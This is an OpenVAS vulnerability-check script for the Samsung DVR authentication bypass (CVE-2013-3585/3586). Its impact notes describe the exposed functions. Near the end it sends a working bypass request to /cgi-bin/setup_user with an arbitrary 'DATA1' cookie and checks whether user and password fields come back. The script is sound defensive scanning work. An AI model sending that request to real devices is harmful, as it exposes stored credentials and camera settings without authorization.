###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_samsung_dvr_auth_bypass_08_13.nasl 11 2013-10-27 10:12:02Z jan $
#
# Samsung DVR Authentication Bypass
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "This vulnerability allows remote unauthenticated users to:
- Get/set/delete username/password of local users (/cgi-bin/setup_user)
- Get/set DVR/Camera general configuration
- Get info about the device/storage
- Get/set the NTP server
- Get/set many other settings
Impact Level: Application";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103770";

tag_insight = "In most of the CGIs on the Samsung DVR, the session check is made
in a wrong way, that allows to access protected pages simply putting an arbitrary
cookie into the HTTP request. ";


tag_affected = "Samsung DVR with firmware version <= 1.10";
tag_summary = "The remote Samsung DVR is prone to an Authentication Bypass.";
tag_solution = "Ask the Vendor for an update.";
tag_vuldetect = "Check if /cgi-bin/setup_user is accessible without authentication";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version ("$Revision: 11 $");
 script_cve_id("CVE-2013-3585", "CVE-2013-3586");
 script_bugtraq_id(61942, 61938);
 script_tag(name:"cvss_base", value:"7.6");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:C/I:C/A:C");

 script_name("Samsung DVR Authentication Bypass");

 desc = "
Summary:
" + tag_summary + "

Vulnerability Detection:
" + tag_vuldetect + "

Vulnerability Insight:
" + tag_insight + "

Impact:
" + tag_impact + "

Affected Software/OS:
" + tag_affected + "

Solution:
" + tag_solution;

 script_xref(name:"URL", value:"http://www.osvdb.com/96509");
 script_xref(name:"URL", value:"http://www.osvdb.com/96510");
 script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/882286");
 script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/27753");
 script_xref(name:"URL", value:"http://www.andreafabrizi.it/?exploits:samsung:dvr");

 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-08-21 14:27:11 +0200 (Wed, 21 Aug 2013)");
 script_description(desc);
 script_summary("Determine if /cgi-bin/setup_user is accessible without authentication");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "affected" , value : tag_affected);
  }

 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

url = '/';
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if("<title>Web Viewer for Samsung DVR</title>" >!< buf)exit(0);

host = get_host_name();

req = 'GET /cgi-bin/setup_user HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'Connection: close\r\n';

result = http_send_recv(port:port, data:req + '\r\n', bodyonly:FALSE);

if("top.document.location.href" >!< result)exit(99);

req += 'Cookie: DATA1=YWFhYWFhYWFhYQ==\r\n\r\n';

result = http_send_recv(port:port, data:req + '\r\n', bodyonly:FALSE);

if("<title>User</title>" >< result && "nameUser_Name_0" >< result && "nameUser_Pw_0" >< result) {

  security_hole(port:port);
  exit(0);

}
